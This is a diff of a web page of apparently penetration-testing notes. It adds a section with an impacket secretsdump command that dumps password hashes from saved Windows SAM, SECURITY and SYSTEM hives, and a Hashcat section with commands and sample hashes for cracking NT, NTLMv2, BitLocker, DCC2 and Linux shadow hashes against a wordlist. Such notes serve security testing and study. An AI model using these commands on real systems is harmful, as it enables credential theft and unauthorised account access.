@@ -362,8 +362,30 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#dump-sam-hashes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Dump SAM Hashes
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hashcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hashcat
+      
+    </span>
+  </a>
   
 </li>
       
@@ -443,6 +465,17 @@
 </code></pre>
 <h2 id="john-the-ripper">John The Ripper</h2>
 <h3 id="_1"></h3>
+<h3 id="dump-sam-hashes">Dump SAM Hashes</h3>
+<pre><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+</code></pre>
+<h2 id="hashcat">Hashcat</h2>
+<pre><code>sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt # NT Hash
+sudo hashcat -m 1000 '64f12cddaa88057e06a81b54e73b949b' /usr/share/wordlists/rockyou.txt # NT Hash
+sudo hashcat -m 5000 hashestocrack.txt /usr/share/wordlists/rockyou.txt # NTLMv2 Hash
+hashcat -a 0 -m 22100 '$bitlocker$0$16$***' /usr/share/wordlists/rockyou.txt # Bitlocker Hash
+hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt # DCC2 hashes
+hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked # Linux /etc/shadow
+</code></pre>
 
 
 
